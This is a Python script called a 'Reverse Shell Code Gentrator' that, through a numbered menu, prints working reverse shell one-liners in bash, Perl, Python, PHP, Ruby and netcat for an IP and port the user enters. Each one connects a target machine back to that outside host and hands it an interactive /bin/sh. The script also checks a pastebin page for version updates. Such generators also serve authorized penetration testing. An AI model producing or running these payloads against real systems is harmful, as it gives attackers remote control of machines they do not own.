#v1.1
#REPAY CODED BY BOTCODER
#COPYRIGHT
import os
import sys
path=os.getcwd()
path=os.path.join(path,"lib")
sys.path.append(path)
import urllib.request
from bs4 import BeautifulSoup
from colorama import Fore,init
init()
import webbrowser
import time

de_version="1.1"
class repay:
    def bash(self,ip,port):
        bash=r'bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1'
        print(bash)
    def perl(self,ip,port):
        ip="\""+ip+"\""
        perl=r"perl -e 'use Socket;$i="+ip+r";$p="+port+r";socket(S,PF_INET,SOCK_STREAM,getprotobyname("+"\"tcp\""+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+"\">&S\""+");open(STDOUT,"+"\">&S\""+");open(STDERR,"+"\">&S\""+");exec("+"\"/bin/sh -i\""+");};'"
        print(perl)
    def python(self,ip,port):
        ip = "\"" + ip + "\""
        python=r"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ip+r","+port+r"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["+"\"/bin/sh\""+","+"\"-i\""+"]);'"
        print(python)
    def php(self,ip,port):
        ip = "\"" + ip + "\""
        php=r"php -r '$sock=fsockopen("+ip+r","+port+r");exec("+"\"/bin/sh -i <&3 >&3 2>&3\")"+";'"
        print(php)
    def ruby(self,ip,port):
        ip = "\"" + ip + "\""
        ruby=r"ruby -rsocket -e'f=TCPSocket.open("+ip+r","+port+").to_i;exec sprintf("+"\"/bin/sh -i <&%d >&%d 2>&%d\""+",f,f,f)'"
        print(ruby)
    def netcat(self,ip,port):
        netcat=r"nc -e /bin/sh "+ip+" "+port
        print(netcat)
    def exit(self):
        exit()
def chech_con():
    try:
        urllib.request.urlopen('https://www.google.com',timeout=3)
    except KeyboardInterrupt:
        print(Fore.RED + "Stopped by User" + Fore.RESET)
        exit()
    except:
        print(Fore.RED+'Please Check your connection'+Fore.RESET)
        exit()
def banner():
    banner=(Fore.BLUE+'''
                                   ___                ___              _  _  
                                  | _ \     ___      | _ \   __ _     | || | 
                                  |   /    / -_)     |  _/  / _` |     \_, | 
                                  |_|_\    \___|    _|_|_   \__,_|    _|__/  
                                _|"""""| _|"""""| _| """ | _|"""""| _| """"| 
                                "`-0-0-' "`-0-0-' "`-0-0-' "`-0-0-' "`-0-0-"                        
    '''+Fore.RESET)
    title=(Fore.RED+'''                                 (Reverse Shell Code Gentrator)     ''' +Fore.RESET  )
    credit = (Fore.CYAN +'''    \n                                                                             Author : Bot-Coder
                                                                             Github  : https://github.com/BOT-CODER
                                                                             Please contact us in github page                                                           
            ''' + Fore.RESET)

    print(banner,title,credit)

def ip_collect():
    global de_ip
    import socket
    host = socket.gethostname()
    de_ip = socket.gethostbyname(host)
def clear():
    import platform , os
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')
def main():
    R=repay()
    ip_collect()
    print(Fore.YELLOW+"1.Bash\n2.Perl\n3.Python\n4.PHP\n5.Ruby\n6.Netcat\n7.Exit"+Fore.RESET)
    opt=int(input(Fore.GREEN+"Code For Reverse Connection :"+Fore.RESET))
    if opt == 7:
        exit()
    ip = input(Fore.MAGENTA + "Enter the IP" + "(" + Fore.RED + "Default->" + de_ip + Fore.RESET + Fore.MAGENTA + ")" + Fore.RESET + ":") or str(de_ip)
    port = input(Fore.MAGENTA + "Enter the PORT" + "(" + Fore.RED + "Default->8080" + Fore.RESET + Fore.MAGENTA + ")" + Fore.RESET + ":") or "8080"
    print(end='\n')
    if opt == 1:
        R.bash(ip,port)
    elif opt == 2:
        R.perl(ip,port)
    elif opt == 3:
        R.python(ip,port)
    elif opt == 4:
        R.php(ip,port)
    elif opt == 5:
        R.ruby(ip,port)
    elif opt==6:
        R.netcat(ip,port)
    else :
        print('Invaild')
    '''
    elif opt==8:
        from threading import Thread
        Thread(target=R.bash()).start()

        for i in ['bash','perl','python','php','ruby','netcat']:
            R.{}(ip,port).format(i)
    '''

if __name__=='__main__':
    while True:
        clear()
        init()
        con=chech_con()
        banner()
        page = urllib.request.urlopen('https://pastebin.com/A9ji8jbm').read()
        soup = BeautifulSoup(page, 'html.parser')
        version = soup.find(id="paste_code").text
        if version > de_version:
            print(Fore.CYAN+"Version "+Fore.MAGENTA+version+Fore.CYAN+" is Avaiable")
            print(Fore.RED+"Please update the Program")
            print("Redirecting...."+Fore.RESET)
            time.sleep(3)
            webbrowser.open('https://github.com/BOT-CODER/SniperMan')
            exit()
        else:
            main()
            input(Fore.RED+"\nPress Enter to reload the script"+Fore.RESET)
            clear()


